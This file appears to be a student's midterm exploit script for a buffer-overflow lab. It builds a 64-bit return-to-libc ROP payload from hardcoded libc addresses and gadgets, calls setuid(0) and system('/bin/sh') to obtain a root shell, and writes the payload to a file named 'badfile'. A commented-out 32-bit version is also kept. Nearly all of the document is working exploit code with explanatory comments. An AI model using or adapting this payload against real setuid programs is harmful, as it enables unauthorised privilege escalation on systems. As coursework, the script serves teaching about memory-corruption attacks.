#!/usr/bin/python3
import sys

#Ori Adkins Midterm 1

# Translate to 64 bit, what do we need?

# We will need the libc address space, the addresses for system, exit, setuid, and sprintf
# we will also need the address of shell inside the libc library

# Found this using gdb info proc mappings 
libc_address = 0x7ffff7dc5000

# gdb using various prints (p system, exit, ect.)
system_address = 0x7ffff7e17290
exit_address = 0x7ffff7e0ba40
setuid_address = 0x7ffff7ea9150
sprintf_address = 0x7ffff7e26e20

# found by using a function in gdb called checkmem
# the command was checkmem "/bin/sh" 0x7ffff7dc5000 0x7ffff7fb3000
binsh_address = 0x7ffff7f795bd

# create a null terminator for strcpy to stop
null_address = binsh_address + len("/bin/sh")

# after this poinr, we pick useful gadgets from libc to ensure the ROP gets called

#obtained using the useful function ROPgadget 
# this just searches in libc for the specified instructions, allows us to jump to them,
pop_rdi = 0x0000000000023b6a + libc_address
pop_rsi = 0x000000000002601f + libc_address
ret = 0x0000000000022679 + libc_address

rsp_add = 0x0000000000024242 + libc_address

# just a hardcoded section in our payload stack, targets here to complete the jump
target = 0x7fffffffdae0 

#found with p/d $rsp - (long)&buffer
buffer_offset = 120 

#now, we assemble the payload

#structure
# buffer offset -> rsp instruction (return pointer, where the address was) -> padding -> ROP Chain

#ROP chain structure - 

payload = b"A" * buffer_offset

payload += rsp_add.to_bytes(8, byteorder='little')

payload += b"B" * 8


# this portion of the payload calls setuid with root priveledge 
payload += pop_rdi.to_bytes(8, byteorder='little')
payload += 0x0.to_bytes(8, byteorder='little')
payload += setuid_address.to_bytes(8, byteorder='little')

#this portion calls system with bin/sh/ as the arguement
payload += pop_rdi.to_bytes(8, byteorder='little')
payload += binsh_address.to_bytes(8, byteorder='little')
payload += system_address.to_bytes(8, byteorder='little')
payload += pop_rdi.to_bytes(8, byteorder='little')
payload += 0x0.to_bytes(8, byteorder='little')
payload += exit_address.to_bytes(8, byteorder='little')


#How ir changed from 32bit to 64bit
# you need to account for how memory addresses are 8 bytes now, not 4
# all functions qwere changed to make space for 8 bytes
# in 32 bit ystsems call function args on the stack
# in 64 bit the first one is in the rdi, so we need to add these gadgets to make it work
# we pass bin/sh/ into rdi before calling sys
# 64 bit requires explicit loading of arguements into registers (why we need gadgets)

#the old program only used the essentials, but since 64 bit is more xomplicated
# I had to utilize stack pointer adjustment to make sure the ROP chain executed properly



'''

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

sh_addr = 0xf7f41de8     # The address of "/bin/sh"
content[120:124] = (sh_addr).to_bytes(4,byteorder='little')

exit_addr = 0xf7dc35b0    # The address of exit()
content[116:120] = (exit_addr).to_bytes(4,byteorder='little')

system_addr = 0xf7dd48e0     # The address of system()
content[112:116] = (system_addr).to_bytes(4,byteorder='little')

'''
# Save content to a file
with open("badfile", "wb") as f:
  f.write(payload)
